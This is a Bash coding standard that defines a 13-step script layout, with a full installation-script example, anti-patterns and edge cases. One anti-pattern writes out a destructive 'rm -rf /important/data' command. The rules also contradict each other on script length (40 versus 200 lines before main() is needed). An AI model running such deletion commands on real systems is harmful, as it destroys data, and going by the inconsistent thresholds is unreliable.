**Rule: BCS00**

# Bash Coding Standard

This document defines a comprehensive Bash coding standard and presumes Bash 5.2 and higher; this is not a compatibility standard.

"This isn't just a coding standard -- it's a systems engineering philosophy applied to Bash." -- Biksu Okusi

## Coding Principles
- K.I.S.S.
- "The best process is no process"
- "Everything should be made as simple as possible, but not simpler."

NOTE: Do not over-engineer scripts; functions and variables not required for the operation of the script should not be included and/or removed.

## Contents
1. [Script Structure & Layout](#script-structure--layout)
2. [Variable Declarations & Constants](#variable-declarations--constants)
3. [Variable Expansion & Parameter Substitution](#variable-expansion--parameter-substitution)
4. [Quoting & String Literals](#quoting--string-literals)
5. [Arrays](#arrays)
6. [Functions](#functions)
7. [Control Flow](#control-flow)
8. [Error Handling](#error-handling)
9. [Input/Output & Messaging](#inputoutput--messaging)
10. [Command-Line Arguments](#command-line-arguments)
11. [File Operations](#file-operations)
12. [Security Considerations](#security-considerations)
13. [Code Style & Best Practices](#code-style--best-practices)
14. [Advanced Patterns](#advanced-patterns)

BSC00


---


**Rule: BCS0100**

# Script Structure & Layout

This section defines the mandatory 13-step structural layout that all Bash scripts must follow, ensuring consistency, maintainability, and safe initialization. It covers the complete organization from shebang through the final `#fin` marker, including script metadata, shopt settings, dual-purpose script patterns, FHS compliance for system integration, file extension guidelines, and the bottom-up function organization principle where low-level utilities are defined before high-level orchestration functions.


---


**Rule: BCS010101**

### Complete Working Example

**This subrule provides a comprehensive, production-quality installation script that demonstrates all 13 mandatory steps of the BCS0101 layout pattern in action.**

---

## Complete Example: All 13 Steps

This example demonstrates every step of the mandatory structure in a realistic installation script:

```bash
#!/bin/bash
#shellcheck disable=SC2034  # Some variables used by sourcing scripts
# Configurable installation script with dry-run mode and validation
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# ============================================================================
# Script Metadata
# ============================================================================

declare -r VERSION=2.1.420
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Global Variable Declarations
# ============================================================================

# Configuration (can be modified by arguments)
declare -- PREFIX=/usr/local
declare -- APP_NAME=myapp
declare -- SYSTEM_USER=myapp

# Derived paths (updated when PREFIX changes)
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- SHARE_DIR="$PREFIX"/share
declare -- CONFIG_DIR=/etc/"$APP_NAME"
declare -- LOG_DIR=/var/log/"$APP_NAME"

# Runtime flags
declare -i DRY_RUN=0
declare -i FORCE=0
declare -i INSTALL_SYSTEMD=0

# Accumulation arrays
declare -a WARNINGS=()
declare -a INSTALLED_FILES=()

# ============================================================================
# Step 8: Color Definitions
# ============================================================================

if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' BOLD=$'\033[1m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' BOLD='' NC=''
fi

# ============================================================================
# Step 9: Utility Functions
# Requires Color Definitions, and globals VERBOSE DEBUG PROMPT SCRIPT_NAME
# Upon script maturity, remove those functions not actually required by script.
# ============================================================================
declare -i VERBOSE=1
#declare -i DEBUG=0 PROMPT=1

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    vecho)   : ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
#    debug)   prefix+=" ${CYAN}DEBUG${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
#debug() { ((DEBUG)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
# Yes/no prompt
yn() {
  #((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}
noarg() { (($# > 1)) || die 22 "Option ${1@Q} requires an argument"; }

# ============================================================================
# Step 10: Business Logic Functions
# ============================================================================

# Update derived paths when PREFIX or APP_NAME changes
update_derived_paths() {
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib
  SHARE_DIR="$PREFIX"/share

  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
}

show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Installation script

Configurable installation script with dry-run mode.

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -p, --prefix DIR       Installation prefix (default: /usr/local)
  -u, --user USER        System user for service (default: myapp)
  -n, --dry-run          Show what would be done without doing it
  -f, --force            Overwrite existing files
  -s, --systemd          Install systemd service unit
  -v, --verbose          Enable verbose output
  -q, --quiet            Disable verbose output
  -h, --help             Display this help message
  -V, --version          Display version information

Examples:
  # Dry-run installation to /opt
  $SCRIPT_NAME --prefix /opt --dry-run

  # Install with systemd service
  $SCRIPT_NAME --systemd --user webapp

  # Force reinstall to default location
  $SCRIPT_NAME --force
EOT
}

check_prerequisites() {
  local -i missing=0
  local -- cmd

  for cmd in install mkdir chmod chown; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      error "Required command not found ${cmd@Q}"
      missing=1
    fi
  done

  if ((INSTALL_SYSTEMD)) && ! command -v systemctl >/dev/null 2>&1; then
    error 'systemd installation requested but systemctl not found'
    missing=1
  fi

  ((missing==0)) || die 1 'Missing required commands'
  success 'All prerequisites satisfied'
}

validate_config() {
  # Validate PREFIX
  [[ -n "$PREFIX" ]] || die 22 'PREFIX cannot be empty'
  [[ "$PREFIX" =~ [[:space:]] ]] && \
      die 22 "PREFIX cannot contain spaces ${PREFIX@Q}"

  # Validate APP_NAME
  [[ -n "$APP_NAME" ]] || die 22 'APP_NAME cannot be empty'
  [[ "$APP_NAME" =~ ^[a-z][a-z0-9_-]*$ ]] || \
      die 22 'Invalid APP_NAME: must start with letter, contain only lowercase, digits, dash, underscore'

  # Validate SYSTEM_USER
  [[ -n "$SYSTEM_USER" ]] || \
      die 22 'SYSTEM_USER cannot be empty'

  # Check write permissions
  if [[ ! -d "$PREFIX" ]]; then
    if ((FORCE)) || yn "Create PREFIX directory ${PREFIX@Q}?"; then
      vecho "Will create ${PREFIX@Q}"
    else
      die 1 'Installation cancelled'
    fi
  fi

  success 'Configuration validated'
}

create_directories() {
  local -- dir

  for dir in "$BIN_DIR" "$LIB_DIR" "$SHARE_DIR" "$CONFIG_DIR" "$LOG_DIR"; do
    if ((DRY_RUN)); then
      info "[DRY-RUN] Would create directory ${dir@Q}"
      continue
    fi

    if [[ -d "$dir" ]]; then
      vecho "Directory exists ${dir@Q}"
    else
      mkdir -p "$dir" || die 1 "Failed to create directory ${dir@Q}"
      success "Created directory ${dir@Q}"
    fi
  done
}

install_binaries() {
  local -- source="$SCRIPT_DIR"/bin
  local -- target=$BIN_DIR

  [[ -d "$source" ]] || die 2 "Source directory not found ${source@Q}"

  ((DRY_RUN==0)) || {
    info "[DRY-RUN] Would install binaries from ${source@Q} to ${target@Q}"
    return 0
  }

  local -- file basename target_file
  local -i count=0
  for file in "$source"/*; do
    [[ -f "$file" ]] || continue

    basename=${file##*/}
    target_file="$target/$basename"

    if [[ -f "$target_file" ]] && ! ((FORCE)); then
      warn "File exists (use --force to overwrite) ${target_file@Q}"
      continue
    fi

    install -m 755 "$file" "$target_file" || \
        die 1 "Failed to install ${basename@Q}"
    INSTALLED_FILES+=("$target_file")
    count+=1
    vecho "Installed ${target_file@Q}"
  done

  success "Installed $count binaries to ${target@Q}"
}

install_libraries() {
  local -- source="$SCRIPT_DIR"/lib
  local -- target="$LIB_DIR"/"$APP_NAME"

  [[ -d "$source" ]] || {
    vecho 'No libraries to install'
    return 0
  }

  ((DRY_RUN==0)) || {
    info "[DRY-RUN] Would install libraries from ${source@Q} to ${target@Q}"
    return 0
  }

  mkdir -p "$target" || die 1 "Failed to create library directory ${target@Q}"

  cp -r "$source"/* "$target"/ || die 1 'Library installation failed'
  chmod -R a+rX "$target"

  success "Installed libraries to ${target@Q}"
}

generate_config() {
  local -- config_file="$CONFIG_DIR"/"$APP_NAME".conf

  ((DRY_RUN==0)) || {
    info "[DRY-RUN] Would generate config ${config_file@Q}"
    return 0
  }

  if [[ -f "$config_file" ]] && ! ((FORCE)); then
    warn "Config file exists (use --force to overwrite) ${config_file@Q}"
    return 0
  fi

  cat > "$config_file" <<EOT
# $APP_NAME configuration
# Generated by $SCRIPT_NAME $VERSION on $(date -u +%Y-%m-%d)

[installation]
prefix = $PREFIX
version = $VERSION
install_date = $(date -u +%Y-%m-%dT%H:%M:%SZ)

[paths]
bin_dir = $BIN_DIR
lib_dir = $LIB_DIR
config_dir = $CONFIG_DIR
log_dir = $LOG_DIR

[runtime]
user = $SYSTEM_USER
log_level = INFO
EOT

  chmod 644 "$config_file"
  success "Generated config ${config_file@Q}"
}

install_systemd_unit() {
  ((INSTALL_SYSTEMD)) || return 0

  local -- unit_file=/etc/systemd/system/"$APP_NAME".service

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would install systemd unit ${unit_file@Q}"
    return 0
  fi

  cat > "$unit_file" <<EOT
[Unit]
Description=$APP_NAME Service
After=network.target

[Service]
Type=simple
User=$SYSTEM_USER
ExecStart=$BIN_DIR/$APP_NAME
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
EOT

  chmod 644 "$unit_file"
  systemctl daemon-reload || warn 'Failed to reload systemd daemon'

  success "Installed systemd unit ${unit_file@Q}"
}

set_permissions() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would set directory permissions'
    return 0
  fi

  # Log directory should be writable by system user
  if id "$SYSTEM_USER" >/dev/null 2>&1; then
    chown -R "$SYSTEM_USER":"$SYSTEM_USER" "$LOG_DIR" 2>/dev/null || \
      warn "Failed to set ownership on ${LOG_DIR@Q} (may need sudo)"
  else
    warn "System user ${SYSTEM_USER@Q} does not exist - skipping ownership changes"
  fi

  success 'Permissions configured'
}

show_summary() {
  cat <<EOT

${BOLD}Installation Summary${NC}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Application:    $APP_NAME
  Version:        $VERSION
  Prefix:         $PREFIX
  System User:    $SYSTEM_USER

  Directories:
    Binaries:     $BIN_DIR
    Libraries:    $LIB_DIR
    Config:       $CONFIG_DIR
    Logs:         $LOG_DIR

  Files Installed: ${#INSTALLED_FILES[@]}
  Warnings:        ${#WARNINGS[@]}

EOT

  if ((${#WARNINGS[@]})); then
    echo "${YELLOW}Warnings:${NC}"
    local -- warning
    for warning in "${WARNINGS[@]}"; do
      echo "  • $warning"
    done
    echo
  fi

  if ((DRY_RUN)); then
    echo "${CYAN}This was a DRY-RUN - no changes were made${NC}"
  fi
}

# ============================================================================
# Step 11: main() Function
# ============================================================================

main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      -p|--prefix)   noarg "$@"
                     shift
                     PREFIX=$1
                     update_derived_paths
                     ;;

      -u|--user)     noarg "$@"
                     shift
                     SYSTEM_USER=$1
                     ;;

      -n|--dry-run)  DRY_RUN=1 ;;
      -f|--force)    FORCE=1 ;;
      -s|--systemd)  INSTALL_SYSTEMD=1 ;;

      -v|--verbose)  VERBOSE+=1 ;;
      -q|--quiet)    VERBOSE=0 ;;

      -V|--version)  echo "$SCRIPT_NAME $VERSION"
                     return 0
                     ;;
      -h|--help)     show_help
                     return 0
                     ;;

      -[punfsvqVh]*) #shellcheck disable=SC2046 #split up single options
                     set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;

      -*)            die 22 "Invalid option ${1@Q} (use --help for usage)" ;;
      *)             die 2  "Unexpected argument ${1@Q}" ;;
    esac
    shift
  done

  # Make configuration readonly after argument parsing
  readonly -- PREFIX APP_NAME SYSTEM_USER
  readonly -- BIN_DIR LIB_DIR SHARE_DIR CONFIG_DIR LOG_DIR
  readonly -i VERBOSE DRY_RUN FORCE INSTALL_SYSTEMD

  # Show mode information
  ((DRY_RUN==0)) || info 'DRY-RUN mode enabled - no changes will be made'
  ((VERBOSE==0)) || info 'Verbose mode enabled'
  ((FORCE==0))   || info 'Force mode enabled - will overwrite existing files'

  # Execute installation workflow
  info "Installing $APP_NAME $VERSION to ${PREFIX@Q}"

  check_prerequisites
  validate_config
  create_directories
  install_binaries
  install_libraries
  generate_config
  install_systemd_unit
  set_permissions

  show_summary

  if ((DRY_RUN)); then
    info 'Dry-run complete - review output and run without --dry-run to install'
  else
    success "Installation of $APP_NAME $VERSION complete!"
  fi
}

# ============================================================================
# Step 12: Script Invocation
# ============================================================================

main "$@"

# ============================================================================
# Step 13: End Marker
# ============================================================================

#fin
```

---

## What This Example Demonstrates

### Structural Elements

1. **Complete initialization sequence** - Shebang, shellcheck, description, strict mode, shopt
2. **Comprehensive metadata** - Version, paths, script name (all readonly)
3. **Organized global variables** - Configuration, runtime flags, arrays
4. **Terminal-aware colors** - Conditional color codes based on TTY
5. **Standard messaging functions** - Complete `_msg()` system with all helpers
6. **Business logic hierarchy** - From validation to installation to summary
7. **Argument parsing with short options** - Full getopt-style handling
8. **Progressive readonly** - Variables become immutable after parsing

### Functional Patterns

**Dry-run mode throughout:** Every operation checks `DRY_RUN` flag and shows what would happen without executing.

**Force mode handling:** Existing files trigger warnings unless `--force` specified.

**Derived paths pattern:** When `PREFIX` changes, all dependent paths update via `update_derived_paths()`.

**Validation before action:** Prerequisites and configuration validated before any filesystem operations.

**Error accumulation:** Warnings collected in array for final summary.

**User prompts:** Interactive confirmation with `yn()` function when needed.

**Systemd integration:** Conditional service installation with proper unit file generation.

### Production Readiness

- Complete help and usage text
- Version information
- Verbose/quiet modes
- Configuration file generation
- Permission management
- Summary report
- Graceful error handling throughout
- All 13 mandatory steps correctly implemented

This example serves as a template for production installation scripts and demonstrates how all BCS principles work together in a real-world scenario.


---


**Rule: BCS010102**

### Common Layout Anti-Patterns

**This subrule demonstrates common violations of the BCS0101 13-step layout pattern, showing both the incorrect approach and the correct solution for each.**

---

## Anti-Patterns

### ✗ Wrong: Missing `set -euo pipefail`

```bash
#!/usr/bin/env bash

# Script starts without error handling
VERSION=1.0.0

# Commands can fail silently
rm -rf /important/data
cp config.txt /etc/
```

**Problem:** Errors are not caught, script continues executing after failures, leading to silent corruption or incomplete operations.

### ✓ Correct: Error Handling First

```bash
#!/usr/bin/env bash

# Installation script with proper safeguards

set -euo pipefail

shopt -s inherit_errexit shift_verbose

declare -r VERSION=1.0.0
# ... rest of script
```

---

### ✗ Wrong: Declaring Variables After Use

```bash
#!/usr/bin/env bash
set -euo pipefail

main() {
  # Using VERBOSE before it's declared
  ((VERBOSE)) && echo 'Starting...' ||:

  process_files
}

# Variables declared after main()
declare -i VERBOSE=0

main "$@"
#fin
```

**Problem:** Variables are referenced before they're declared, leading to "unbound variable" errors with `set -u`.

### ✓ Correct: Declare Before Use

```bash
#!/usr/bin/env bash
set -euo pipefail

# Declare all globals up front
declare -i VERBOSE=0
declare -i DRY_RUN=0

main() {
  # Now safe to use
  ((VERBOSE)) && echo 'Starting...' ||:

  process_files
}

main "$@"
#fin
```

---

### ✗ Wrong: Business Logic Before Utilities

```bash
#!/usr/bin/env bash
set -euo pipefail

# Business logic defined first
process_files() {
  local -- file
  for file in *.txt; do
    # Calling die() which isn't defined yet!
    [[ -f "$file" ]] || die 2 "Not a file ${file@Q}"
    echo "Processing ${file@Q}"
  done
}

# Utilities defined after business logic
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

main() {
  process_files
  : ...
}

main "$@"
#fin
```

**Problem:** `process_files()` calls `die()` which isn't defined yet. This works in bash (functions are resolved at runtime) but violates the principle of bottom-up organization and makes code harder to understand.

### ✓ Correct: Utilities Before Business Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

# Utilities first
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# Business logic can safely call utilities
process_files() {
  local -- file
  for file in *.txt; do
    [[ -f "$file" ]] || die 2 "Not a file ${file@Q}"
    echo "Processing ${file@Q}"
  done
}

main() {
  process_files
}

main "$@"
#fin
```

---

### ✗ Wrong: No `main()` Function in Large Script

`set -euo pipefail` must be placed before the start of the first line of executing code.

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0

# ... 200 lines of functions ...

# Argument parsing scattered throughout
if [[ "$1" == '--help' ]]; then
  echo 'Usage: ...'
  exit 0
fi

# Business logic runs directly
check_prerequisites
validate_config
install_files

echo 'Done'
#fin
```

**Problem:** No clear entry point, argument parsing is scattered, can't easily test the script, can't source it to test individual functions.

### ✓ Correct: Use `main()` for Scripts Over 40 Lines

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0

# ... 200 lines of functions ...

main() {
  # Centralized argument parsing
  while (($#)); do
    case $1 in
      -h|--help) show_help; exit 0 ;;
      *) die 22 "Invalid argument ${1@Q}" ;;
    esac
    shift
  done

  # Clear execution flow
  check_prerequisites
  validate_config
  install_files

  success 'Installation complete'
}

main "$@"
#fin
```

---

### ✗ Wrong: Missing End Marker

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0

main() {
  echo 'Hello, World!'
}

main "$@"
# File ends without #fin or #end
```

**Problem:** No visual confirmation that file is complete, harder to detect truncated files.

### ✓ Correct: Always End With `#fin`

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0

main() {
  echo 'Hello, World!'
}

main "$@"
#fin
```

---

### ✗ Wrong: Readonly Before Parsing Arguments

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0
declare -r PREFIX=/usr/local

# Made readonly too early!
readonly -- VERSION PREFIX

main() {
  while (($#)); do
    case $1 in
      --prefix)
        shift
        # This will fail - PREFIX is readonly!
        PREFIX=$1
        ;;
    esac
    shift
  done
}

main "$@"
#fin
```

**Problem:** Variables that need to be modified during argument parsing are made readonly too early.

### ✓ Correct: Readonly After Argument Parsing

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- PREFIX=/usr/local  # Will be modified during parsing

main() {
  while (($#)); do
    case $1 in
      --prefix)
        shift
        PREFIX=$1  # OK - not readonly yet
        ;;
    esac
    shift
  done

  # Now make readonly after parsing complete
  readonly -- PREFIX

  # Rest of logic...
}

main "$@"
#fin
```

---

### ✗ Wrong: Mixing Declaration and Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0

# Some globals
declare -i VERBOSE=0

# Function in the middle
check_something() {
  echo 'Checking...'
}

# More globals after function
declare -- PREFIX=/usr/local
declare -- CONFIG_FILE=''

main() {
  check_something
}

main "$@"
#fin
```

**Problem:** Globals are scattered throughout the file, making it hard to see all state variables at once.

### ✓ Correct: All Globals Together

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0

# All globals in one place
declare -i VERBOSE=0
declare -- PREFIX=/usr/local
declare -- CONFIG_FILE=''

# All functions after globals
check_something() {
  echo 'Checking...'
}

main() {
  check_something
}

main "$@"
#fin
```

---

### ✗ Wrong: Sourcing Without Protecting Execution

```bash
#!/usr/bin/env bash
# This file is meant to be sourced, but...

set -euo pipefail  # Modifies caller's shell!!

die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# Runs automatically when sourced!
main "$@"
#fin
```

**Problem:** When sourced, this modifies the caller's shell settings and runs `main` automatically.

### ✓ Correct: Dual-Purpose Script

```bash
#!/usr/bin/env bash
# Only set strict mode when executed (not sourced)

error() { >&2 echo "ERROR: $*"; }

die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# Only run main when executed (not sourced)
# Fast exit if sourced
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Now start main script
set -euo pipefail

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_NAME=${SCRIPT_PATH##*/}

: ...

main() {
  echo 'Running main'
  : ...
}

main "$@"
#fin
```

---

## Summary

These eight anti-patterns represent the most common violations of the BCS0101 13-step layout:

1. **Missing strict mode** - Scripts without `set -euo pipefail` fail silently
2. **Declaration order** - Variables must be declared before use
3. **Function organization** - Utilities must come before business logic
4. **Missing main()** - Large scripts need structured entry point
5. **Missing end marker** - Scripts must end with `#fin` or `#end`
6. **Premature readonly** - Variables that change must not be readonly until after parsing
7. **Scattered declarations** - All globals must be grouped together
8. **Unprotected sourcing** - Dual-purpose scripts must protect execution code

Following the correct patterns ensures scripts are safe, maintainable, and predictable. Each violation leads to specific classes of bugs that are completely preventable through proper structure.


---


**Rule: BCS010103**

### Edge Cases and Variations

**This subrule covers special scenarios where the standard 13-step BCS0101 layout may be modified or simplified for specific use cases.**

---

## Edge Cases and Variations

### When to Skip `main()` Function

**Small scripts under 200 lines** can skip `main()` and run directly:

```bash
#!/usr/bin/env bash
set -euo pipefail

# Simple file counter - only 20 lines total
declare -i count=0

for file in "$@"; do
  [[ ! -f "$file" ]] || count+=1
done

echo "Found $count files"
#fin
```

**Rationale:** The overhead of `main()` isn't justified for trivial scripts.

### Sourced Library Files

**Files meant only to be sourced** can skip execution parts:

```bash
#!/usr/bin/env bash
# Library of utility functions - meant to be sourced, not executed

# Don't use set -e when sourced (would affect caller)
# Don't make variables readonly (caller might need to modify)

is_integer() { [[ "$1" =~ ^-?[0-9]+$ ]]; }

is_valid_email() { [[ "$1" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; }

# No main(), no execution
# Just function definitions for other scripts to use
#fin
```

### Scripts With External Configuration

**When sourcing config files**, structure might include:

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0
: ...

# Default configuration
declare -- CONFIG_FILE="${XDG_CONFIG_HOME:-$HOME/.config}"/myapp/config.sh
declare -- DATA_DIR="${XDG_DATA_HOME:-$HOME/.local/share}"/myapp

# Source config file if it exists and can be read
if [[ -r "$CONFIG_FILE" ]]; then
  #shellcheck source=/dev/null
  source "$CONFIG_FILE" || die 1 "Failed to source config ${CONFIG_FILE@Q}"
fi

# Now make readonly after sourcing config
readonly -- CONFIG_FILE DATA_DIR

# ... rest of script
```

### Platform-Specific Sections

**When handling multiple platforms:**

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0
: ...

# Detect platform
declare -- PLATFORM
case $(uname -s) in
  Darwin) PLATFORM=macos ;;
  Linux)  PLATFORM=linux ;;
  *)      PLATFORM=unknown ;;
esac
readonly -- PLATFORM

# Platform-specific global variables
case $PLATFORM in
  macos)
    declare -- PACKAGE_MANAGER=brew
    declare -- INSTALL_CMD='brew install'
    ;;
  linux)
    declare -- PACKAGE_MANAGER=apt
    declare -- INSTALL_CMD='apt-get install'
    ;;
  *)
    die 1 "Unsupported platform ${PLATFORM@Q}"
    ;;
esac

readonly -- PACKAGE_MANAGER INSTALL_CMD

: ... rest of script
```

### Scripts With Cleanup Requirements

**When trap handlers are needed:**

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0
: ...

# Temporary files array for cleanup
declare -a TEMP_FILES=()

cleanup() {
  local -i exit_code=${1:-$?}
  local -- file

  for file in "${TEMP_FILES[@]}"; do
    [[ ! -f "$file" ]] || rm -f "$file"
  done

  return "$exit_code"
}

# Set trap early, after functions are defined
trap 'cleanup $?' SIGINT SIGTERM EXIT

# ... rest of script uses TEMP_FILES
```

**Trap should be set** after cleanup function is defined but before any code that creates temp files.

---

## When to Deviate from Standard Layout

The 13-step layout is **strongly recommended** for all scripts, but these edge cases represent legitimate exceptions:

### Simplifications
- **Tiny scripts (<200 lines)** - Skip `main()`, run code directly
- **Library files** - Skip `set -e`, `main()`, script invocation
- **One-off utilities** - May skip color definitions, verbose messaging

### Extensions
- **External configuration** - Add config sourcing between metadata and business logic
- **Platform detection** - Add platform-specific globals after standard globals
- **Cleanup traps** - Add trap setup after utility functions but before business logic
- **Logging setup** - May add log file initialization after metadata
- **Lock files** - Add lock acquisition/release around main execution

### Key Principles

Even when deviating, maintain these principles:

1. **Safety first** - `set -euo pipefail` still comes first (unless library file)
2. **Dependencies before usage** - Bottom-up organization still applies
3. **Clear structure** - Readers should easily understand the flow
4. **Minimal deviation** - Only deviate when there's clear benefit
5. **Document reasons** - Comment why you're deviating from standard

### Examples of Inappropriate Deviation

**Don't do this:**
```bash
# ✗ Wrong - arbitrary reordering without reason
#!/usr/bin/env bash

# Functions before set -e
validate_input() { : ... }

set -euo pipefail  # Too late!

# Globals scattered
declare -r VERSION=1.0.0
check_system() { : ... }
declare -- PREFIX=/usr
```

**Instead:**
```bash
# ✓ Correct - standard order maintained
#!/usr/bin/env bash
set -euo pipefail

declare -r VERSION=1.0.0
declare -- PREFIX=/usr

validate_input() { : ... }
check_system() { : ... }
```

---

## Summary

Edge cases exist for legitimate reasons:
- **Simplification** for tiny scripts that don't need full structure
- **Libraries** that shouldn't modify sourcing environment
- **External config** that must override defaults
- **Platform detection** for cross-platform compatibility
- **Cleanup traps** for resource management

But even with edge cases, the core principles remain:
- Error handling first
- Dependencies before usage
- Clear, predictable structure

Deviate only when necessary, and always maintain the spirit of the standard: **safety, clarity, and maintainability**.


---


**Rule: BCS0101**

## General Layouts for Standard Script

**All Bash scripts should ideally follow a specific 13-step structural layout that ensures consistency, maintainability, and correctness. This bottom-up organizational pattern places low-level utilities before high-level orchestration, allowing each component to safely call previously defined functions. The structure is mandatory for all scripts and ensures that error handling, metadata, dependencies, and execution flow are properly established before any business logic runs.**

For detailed examples, anti-patterns, and edge cases, see:
- **BCS010101** - Complete working example (462-line installation script)
- **BCS010102** - Common anti-patterns and corrections
- **BCS010103** - Edge cases and variations

---

## Rationale

**Why enforce a strict 13-step layout?**

1. **Predictability** - Developers (and AI assistants) know exactly where to find specific components in any script. Metadata is always in step 6, utilities in step 9, business logic in step 10, orchestration in step 11.

2. **Safe Initialization** - The ordering ensures that critical infrastructure is established before it's needed: error handling (`set -euo pipefail`) is configured before any commands run, metadata is available before any function executes, and global variables are declared before any code references them.

3. **Bottom-Up Dependency Resolution** - Lower-level components are defined before higher-level ones that depend on them. Messaging functions come before business logic that calls them, business logic comes before `main()` that orchestrates it. Each function can safely call any function defined above it.

4. **Testing and Maintenance** - Consistent structure makes scripts easier to test, debug, and maintain. You can source a script to test individual functions, extract utilities for reuse, or understand unfamiliar code quickly because the structure is standardized.

5. **Error Prevention** - The strict ordering prevents entire classes of errors: using undefined functions, referencing uninitialized variables, or running business logic before error handling is configured. Many subtle bugs are prevented by structure alone.

6. **Documentation Through Structure** - The layout itself documents the script's organization. The progression from infrastructure (steps 1-8) through implementation (steps 9-10) to orchestration (steps 11-12) tells the story of how the script works.

7. **Production Readiness** - The structure includes all elements needed for production scripts: version tracking, proper error handling, terminal detection for output, argument validation, and clear execution flow. Nothing is left to chance.

---
## The 13 Mandatory Steps

### Step 1: Shebang

**First line of every script - specifies the interpreter.**

```bash
#!/bin/bash
```

**Alternatives:**
```bash
#!/usr/bin/bash
```

```bash
#!/usr/bin/env bash
```

Within a module+script program -- one that can be either sourced or executed -- the shebang can be used again to semantically indicate the beginning of the executable part of the file.

**Rationale for `env` approach:**
- Portable across systems where bash may be in different locations
- Respects user's PATH settings
- Standard on modern systems

### Step 2: ShellCheck Directives (if needed)

**Global directives that apply to the entire script.**

```bash
#shellcheck disable=SC2034  # Unused variables OK (sourced by other scripts)
#shellcheck disable=SC1091  # Don't follow sourced files
#shellcheck disable=SC2155  # I promise I'll be good.
```

**Always include explanatory comments** for disabled checks.

Only use when necessary - don't disable checks without good reason.

### Step 3: Brief Description Comment

**One-line purpose statement immediately after shebang/directives.**

```bash
# Comprehensive installation script with configurable paths and dry-run mode
```

**Not a full header block** - just a concise description.

### Step 4: `set -euo pipefail`

**Mandatory strict error handling configuration.**

```bash
set -euo pipefail
```

**What this enables:**
- `set -e` - Exit on any command failure
- `set -u` - Exit on undefined variable reference
- `set -o pipefail` - Pipelines fail if any command fails (not just the last)

**This MUST come before any commands** (except shebang/comments/shellcheck).

**Optional Bash >= 5 test**

If a Bash version check is *really* necessary, insert it immediately after `set -euo pipefail`:

```bash
#!/bin/bash
#shellcheck disable=1090
# Backup program for sql databases
set -euo pipefail
((${BASH_VERSINFO[0]:-0} > 4)) || { >&2 echo 'error: Require Bash version >= 5'; exit 95; } # check bash version >= 5

```

Always assume you are working in a Bash 5 environment.

### Step 5: `shopt` Settings

**Strongly recommended shell option settings.**
```bash
shopt -s inherit_errexit shift_verbose extglob nullglob
```

    shopt -s inherit_errexit  # Subshells inherit set -e
    shopt -s shift_verbose    # Warn on shift with no arguments
    shopt -s extglob          # Enable extended pattern matching
    shopt -s nullglob         # Empty globs expand to nothing (not literal string)


**Why these specific options:**
- `inherit_errexit` - Prevents subshells from silently continuing after errors
- `shift_verbose` - Catches argument parsing bugs
